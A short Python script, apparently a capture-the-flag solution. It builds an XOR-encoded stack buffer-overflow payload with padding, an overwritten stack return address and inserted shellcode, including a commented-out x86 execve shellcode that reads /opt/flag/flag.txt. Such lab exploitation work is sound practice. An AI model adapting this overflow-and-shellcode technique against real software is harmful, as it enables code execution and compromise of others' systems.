

# xored with @@@@@@@@@@@@@@@@
key = bytearray.fromhex("0b35030f0c2375100908732d2710762e0a3806730402081822040813310d7019")


buf = [
    #i
    "00000000"
    #buffer
    "0000000000000000000000000000000000000000"
    "0000000000000000000000000000000000000000"
    "0000000000000000000000000000000000000000"
    "0000000000000000000000000000000000000000"
    "0000000000000000000000000000000000000000"
    "0000000000000000000000000000000000000000"

    "0000000000000000"
    "0000000000000000"
    "00000000"
    
    # BP
    #"deadbeefcafeface"
    "0000000000000000"
    
    # SP
    #"1234567887654321"
    "b4e1ffffff7f0000" # "00 7f ff ff ff e1 b0"
    ]


# NOP
shellcode = b"\x90\x90\x90\x90\x90\x90\x90"

# cat /opt/flag/flag.txt
#shellcode = b"\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x78\x74\x00\x00\x68\x61\x67\x2e\x74\x68\x67\x2f\x66\x6c\x68\x2f\x66\x6c\x61\x68\x2f\x6f\x70\x74\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80"


payload = []
for piece in buf:
    payload += [ c for c in bytearray.fromhex(piece) ]

for i in range(0, len(shellcode)):
    payload[i+4] = shellcode[i]

encryptedpayload = []

for i in range(0, len(payload)):
    encryptedpayload.append(payload[i] ^ 0x40 ^ key[i % len(key)])

f = open('payload', 'wb')
f.write(bytes(encryptedpayload))
f.close()




